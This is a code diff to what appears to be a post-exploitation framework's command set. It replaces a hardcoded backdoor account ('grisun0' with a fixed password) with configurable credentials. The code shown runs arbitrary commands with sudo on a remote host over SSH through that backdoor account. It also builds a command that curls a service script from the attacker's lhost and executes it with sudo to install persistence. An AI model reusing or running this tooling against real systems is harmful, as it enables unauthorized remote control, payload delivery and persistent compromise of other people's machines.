@@ -1467,7 +1467,7 @@ class PostexpMigratedCommandSet(PendingCommandSet):
 
     def do_ssh_cmd(self, line):
         """
-        Perform Remote Execution Command trow ssh using grisun0 user, see help grisun0
+        Perform Remote Execution Command through SSH using configured start_user. See help grisun0 for backdoor user configuration.
 
         Parameters:
             line (str): The command line input, is the command to execute, if not presented is whoami
@@ -1478,8 +1478,11 @@ class PostexpMigratedCommandSet(PendingCommandSet):
         if not line:
             line = "whoami"
         rhost = self.params['rhost']
-        username = "grisun0"
-        password = "grisgrisgris"
+        username = self.params.get("start_user", "CHANGE_ME")
+        password = self.params.get("start_pass", "CHANGE_ME")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("start_user and start_pass must be configured in payload.json")
+            return
         print_msg(f"Executing ... {line}")
         ssh = f"""sshpass -p '{password}' ssh {username}@{self.params['rhost']} 'echo "{password}" | sudo -S {line}'"""
         self.cmd(ssh)
@@ -1549,7 +1552,7 @@ class PostexpMigratedCommandSet(PendingCommandSet):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'
+        password = self.params.get("start_pass", "CHANGE_ME")
         cmd = f"curl http://{self.params['lhost']}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg("Run the following command to enable and start the service:")
         self.onecmd(f"ssh_cmd {cmd}")
